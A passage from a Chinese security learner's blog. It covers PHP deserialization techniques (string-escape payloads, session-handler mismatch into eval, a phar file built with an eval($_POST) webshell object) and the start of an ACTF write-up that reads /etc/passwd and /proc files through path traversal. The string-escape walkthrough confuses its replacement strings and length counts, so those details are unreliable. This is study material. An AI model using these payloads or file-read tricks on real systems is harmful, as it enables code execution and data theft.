<li><strong>protected（受保护）：</strong> 受保护的类成员则可以被其自身以及其子类和父类访问。(可继承)</li>
<li><strong>private（私有）：</strong> 私有的类成员则只能被其定义所在的类访问。(不可继承)</li>
</ul>
<h3 id="php常见魔术方法"><a href="#php常见魔术方法" class="headerlink" title="php常见魔术方法"></a>php常见魔术方法</h3><p>和普通函数不同的是，它会在某些条件下导致函数自动被触发执行，类似于可以<strong>跳转</strong>。而这就是一般用于构造利用链的核心。</p>
<p><img src="C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20250508161457351.png" alt="image-20250508161457351"></p>
<h3 id="字符串逃逸"><a href="#字符串逃逸" class="headerlink" title="字符串逃逸"></a>字符串逃逸</h3><p>通常是会有一个替换函数，把数据中的字符串替换为另一个更长或者更短的字符串。由此分类为<strong>减少逃逸和增多逃逸</strong>，关于这两个概念容我在此给出我学完之后的理解：</p>
<blockquote>
<p><strong>减少实际上是把序列化后的字符串中属性相关的部分塞进了前面的双引号里面，变成了没有特殊意义的字符串。而增多刚好相反。</strong></p>
</blockquote>
<p>下面根据两道例题来给出具体的解释：</p>
<h4 id="字符串增多"><a href="#字符串增多" class="headerlink" title="字符串增多"></a>字符串增多</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$safe</span>=<span class="keyword">array</span>(<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;php&quot;</span>);</span><br><span class="line">    <span class="variable">$name</span>=<span class="title function_ invoke__">str_replace</span>(<span class="variable">$safe</span>,<span class="string">&quot;hack&quot;</span>,<span class="variable">$name</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$name</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$user</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$pass</span>=<span class="string">&#x27;daydream&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$user</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;user = <span class="variable">$user</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$param</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;param&#x27;</span>];</span><br><span class="line"><span class="variable">$param</span>=<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">test</span>(<span class="variable">$param</span>));</span><br><span class="line"><span class="comment">//echo $param;</span></span><br><span class="line"><span class="variable">$profile</span>=<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$param</span>));</span><br><span class="line"><span class="comment">//var_dump($profile);</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$profile</span>-&gt;pass==<span class="string">&#x27;escaping&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们的目的是将pass变量改为escaping才能获得flag，但是整个流程下来，并没有对其进行更改。</p>
<p>我们能够看到它会将<code>php</code>替换为<code>hack</code>，从而达到字符串的增多，而这个增多可以怎么利用呢？</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;php&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;pass&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;daydream&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>-&gt;</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;hack&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;pass&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;daydream&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>这样是不能被成功反序列化，因为实际字符串长度与前面不符合。每次替换均会将整个字符串增长1，这样便会有1个字符串逃逸出来。如果我们在最后面构造一个我们想构造的属性，进而逃逸出去的话，便会实现我们的目的。</p>
<p>现在数一数我们需要的构造的属性<code>&quot;;s:4:&quot;pass&quot;;s:8:&quot;daydream&quot;;&#125;</code>，共29个字符。只需要29个php即可“顶出去”。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:<span class="number">87</span>:<span class="string">&quot;phpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphp&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;pass&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;escaping&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>我们把<code>phpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphp&quot;;s:4:&quot;pass&quot;;s:8:&quot;escaping&quot;;&#125;</code>作为参数传递过去，这样前面的计数会是这个字符串116，刚好符合替换完之后<code>flagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflag</code>的长度，而在<code>;&#125;</code>处结束，从而忽略后面的内容。</p>
<p>–&gt;</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflag<span class="string">&quot;;s:4:&quot;</span>pass<span class="string">&quot;;s:8:&quot;</span>escaping<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure>

<h4 id="字符串减少"><a href="#字符串减少" class="headerlink" title="字符串减少"></a>字符串减少</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">  	<span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">  			<span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;xx&quot;</span>,<span class="string">&quot;y&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="variable">$username</span> = <span class="string">&quot;mikasa&quot;</span>;</span><br><span class="line">		<span class="variable">$password</span> = <span class="string">&quot;biubiu&quot;</span>;</span><br><span class="line">		<span class="variable">$user</span> = <span class="keyword">array</span>(<span class="variable">$username</span>,<span class="variable">$password</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="comment">//$str1 = filter(serialize($user));</span></span><br><span class="line">		<span class="variable">$str2</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>]));</span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$str2</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;   &quot;</span>;</span><br><span class="line">		<span class="comment">//var_dump(unserialize($str1));</span></span><br><span class="line">		<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$str2</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>刚开始传参如下：</p>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="link">http://localhost:3000/?user</span>[<span class="string"></span>]=mikasa&amp;user[]=biubiu</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">2</span>:&#123;i:<span class="number">0</span>;s:<span class="number">6</span>:<span class="string">&quot;mikasa&quot;</span>;i:<span class="number">1</span>;s:<span class="number">6</span>:<span class="string">&quot;biubiu&quot;</span>;&#125;   <span class="keyword">array</span>(<span class="number">2</span>) &#123; [<span class="number">0</span>]=&gt; <span class="keyword">string</span>(<span class="number">6</span>) <span class="string">&quot;mikasa&quot;</span> [<span class="number">1</span>]=&gt; <span class="keyword">string</span>(<span class="number">6</span>) <span class="string">&quot;biubiu&quot;</span> &#125;</span><br></pre></td></tr></table></figure>

<p>目标是将username改为123456，本题会将xx替换为y从而导致字符串减少，同样的逻辑，减少会把一些字符串吃进去，从而在数组的第二个索引处把password改为123456。</p>
<p><strong>分析</strong>：</p>
<p>仔细分析序列化字符串，<code>&quot;;i:1;s:6:</code>共10个字符，但我们预计第二个字符串后面长度会到两位数，所以应该算是11个，将第一个参数写成22个x,结果如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">2</span>:&#123;i:<span class="number">0</span>;s:<span class="number">24</span>:<span class="string">&quot;yyyyyyyyyyy&quot;</span>;i:<span class="number">1</span>;s:<span class="number">6</span>:<span class="string">&quot;biubiu&quot;</span>;&#125; <span class="keyword">bool</span>(<span class="literal">false</span>)</span><br></pre></td></tr></table></figure>

<p>目前可以看作已经吃掉后面一大坨了，这下就可以自由在字符串二中构造我们想要替换的属性了，<code>;i:1;s:6:&quot;123456&quot;;&#125;</code></p>
<p><code>a:2:&#123;i:0;s:22:&quot;yyyyyyyyyyy&quot;;i:1;s:19:&quot;;i:1;s:6:&quot;123456&quot;;&#125;&quot;;&#125;</code></p>
<p><img src="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/image-20250508161004255.png" alt="image-20250508161004255"></p>
<h3 id="session反序列化"><a href="#session反序列化" class="headerlink" title="session反序列化"></a>session反序列化</h3><p>漏洞产生原因：写入格式和读取格式不一致。</p>
<p>主要处理方式有以下三种：</p>
<p><img src="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/image-20250508162445536.png" alt="image-20250508162445536"></p>
<p><strong>例题</strong></p>
<p><code>php_serialize</code>写，<code>php</code>方式读。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;ben&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p><strong>思路：</strong></p>
<p>写的时候加上竖线后面写构造的poc，在读的时候就会把竖线前面的当作键，后面的进行反序列化。</p>
<p><img src="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/image-20250508163737230.png" alt="image-20250508163737230"></p>
<p>最终通过eval函数成功命令执行。</p>
<h3 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h3><p>类似于java的jar，phar文件本质上是一种压缩文件，会以序列化的形式存储用户自定义的meta-data。<strong>当受影响的文件操作函数调用phar文件时，会自动反序列化meta-data内的内容</strong>。</p>
<p><strong>该漏洞利用条件</strong>：</p>
<ol>
<li><code>phar</code>文件能够上传至服务器</li>
<li>要有可利用的魔术方法</li>
<li>文件操作函数的参数可控，且:、<code>/</code>、<code>phar</code>等特殊字符没有被过滤</li>
</ol>
<p><img src="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/3361420-20240523125342964-937544915.png" alt="img"></p>
<p>一般的利用方式是配合上面这些函数和<code>phar</code>伪协议，从而不依赖<code>unserialize()</code>进行反序列化的操作。</p>
<p>生成文件：（需要php &gt; 5.2 并将<code>php.ini</code>中的<code>phar.readonly</code>设置为Off）</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: text/html; charset=gbk&#x27;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>=<span class="string">&#x27;eval($_POST[&quot;a&quot;]);&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Flag</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;a.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); </span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); </span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>Phar文件有四个部分，<code>stub</code> &#x2F; <code>manifest</code>被压缩的文件的属性,是以序列化存储的，是主要的攻击点 &#x2F; <code>contents</code>文件内容 &#x2F; <code>signature</code>签名。</p>
<p><code>stub</code>的格式为<code>xxx&lt;?php xxx; __HALT_COMPILER();?&gt;</code></p>
<p>而<code>manifest</code>中的meta-data部分有着序列化的内容，在执行时会被反序列化解析。</p>
<p><img src="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/image-20250510153018522.png" alt="image-20250510153018522"></p>
<h2 id="Python反序列化"><a href="#Python反序列化" class="headerlink" title="Python反序列化"></a>Python反序列化</h2><p>Python中也有饭序列化，也是通过两个重要的函数进行实现。</p>
<h3 id="pickle-dumps-和pickle-loads"><a href="#pickle-dumps-和pickle-loads" class="headerlink" title="pickle.dumps()和pickle.loads()"></a><code>pickle.dumps()</code>和<code>pickle.loads()</code></h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> pickle                                                                 </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>text = <span class="string">&#x27;helloworld&#x27;</span>                                                           </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sertext = pickle.dumps(text)                                                  </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(sertext)                                                                </span><br><span class="line"><span class="string">b&#x27;\x80\x04\x95\x0e\x00\x00\x00\x00\x00\x00\x00\x8c\nhelloworld\x94.&#x27;</span>              </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>reltext = pickle.loads(sertext)                                               </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(reltext)                                                                </span><br><span class="line">helloworld                                                                        </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>                                                                          </span><br></pre></td></tr></table></figure>



<p>（不会，待续）</p>
<h2 id="Java反序列化"><a href="#Java反序列化" class="headerlink" title="Java反序列化"></a>Java反序列化</h2><p>参考：</p>
<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1R24y1r71C">PHP反序列化漏洞学习_哔哩哔哩_bilibili</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yatq.xyz/CScourse/CS50-Flask/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/wz.jpg">
      <meta itemprop="name" content="y@7q">
      <meta itemprop="description" content="心不畏死，踏屍前行">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="y@7q">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/CScourse/CS50-Flask/" class="post-title-link" itemprop="url">CS50_Flask</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2025-05-02 02:33:06" itemprop="dateCreated datePublished" datetime="2025-05-02T02:33:06+08:00">2025-05-02</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2025-06-25 22:03:05" itemprop="dateModified" datetime="2025-06-25T22:03:05+08:00">2025-06-25</time>
              </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>4.6k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>4 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="CS50-Flask"><a href="#CS50-Flask" class="headerlink" title="CS50 Flask"></a>CS50 Flask</h1><p>Flask是一个python的后端微型框架，用来方便快捷的生成前端界面。而目前我需要学习FaskAPI,由于和Flask类似，所以我打算先来回顾一遍这一课。</p>
          <!--noindex-->
            <div class="post-button">
              <a class="btn" href="/CScourse/CS50-Flask/#more" rel="contents">
                阅读全文 &raquo;
              </a>
            </div>
          <!--/noindex-->
        
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yatq.xyz/CTF%E8%B5%9B%E4%BA%8B%E5%A4%8D%E7%9B%98/ACTF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/wz.jpg">
      <meta itemprop="name" content="y@7q">
      <meta itemprop="description" content="心不畏死，踏屍前行">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="y@7q">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/CTF%E8%B5%9B%E4%BA%8B%E5%A4%8D%E7%9B%98/ACTF/" class="post-title-link" itemprop="url">ACTF个人wp</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2025-05-02 02:28:49" itemprop="dateCreated datePublished" datetime="2025-05-02T02:28:49+08:00">2025-05-02</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2025-07-20 12:42:31" itemprop="dateModified" datetime="2025-07-20T12:42:31+08:00">2025-07-20</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF%E6%80%BB%E7%BB%93/" itemprop="url" rel="index"><span itemprop="name">CTF总结</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>4k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>4 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="ACTF-upload"><a href="#ACTF-upload" class="headerlink" title="ACTF upload"></a>ACTF upload</h2><p>admin不能直接爆破好像，全都是500报错。先随便注册一个账号登进去</p>
<p>上传文件界面会发现看不到只有一个img标签，且是data数据，base64加密的图片数据。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/image-20250426161848598.png" alt="image-20250426161848598"></p>
<p>尝试直接在file_path参数后面拼接路径读取文件，<code>../../etc/passwd</code>有回显。</p>
<p>把显示出来的数据拿去解密下载下来即可得到数据：<br><img src="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/image-20250426162057409.png" alt="image-20250426162057409"></p>
<p>，尝试读取<code>/proc/self/environ</code>看看有没有直接的flag（,发现灭有 <code>/proc/self/cmdline</code>中显示当前有进程：<code>python /app/app.py </code>于是得到源码app.py：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, redirect, url_for, flash, session</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = os.getenv(<span class="string">&#x27;SECRET_KEY&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&#x27;username&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;upload&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> username == <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> hashlib.sha256(password.encode()).hexdigest() == <span class="string">&#x27;32783cef30bc23d9549623aa48aa8556346d78bd3ca604f277d63d6e573e8ce0&#x27;</span>:</span><br><span class="line">                session[<span class="string">&#x27;username&#x27;</span>] = username</span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">            <span 